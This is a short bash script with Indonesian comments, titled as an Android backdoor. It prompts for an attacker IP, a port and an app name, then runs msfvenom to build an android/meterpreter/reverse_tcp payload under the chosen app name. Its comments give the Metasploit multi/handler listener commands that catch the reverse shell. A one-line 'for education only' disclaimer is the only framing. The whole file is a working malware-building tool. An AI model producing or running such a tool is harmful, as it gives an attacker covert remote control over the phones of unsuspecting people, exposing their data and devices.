#!/bin/bash
# Backdoor android
# Hanya untuk edukasi, jangan disalahgunakan.

payload="android/meterpreter/reverse_tcp"

# Asumsi 
#----------------------------------------
# Ip penyerang (kali linux) 192.168.1.10 
# Port penyerang (kali linux) 4444
#----------------------------------------

read -p "Masukkan alamat ip address: " lhost
read -p "Masukkan port: " lport
read -p "Masukkan nama aplikasi untuk backdoor android: " nama_aplikasi
msfvenom -p "$payload"  LHOST="$lhost" LPORT="$lport" > "$nama_aplikasi"

# Disisi penyerang (kali linux)
# +-------------------------------------------
# msfconsole                                  
# use exploit/multi/handler                   
# set payload android/meterpreter/reverse_tcp 
# set lhost 192.168.0.209                     
# set lport 443                               
# exploit                                     
# --------------------------------------------
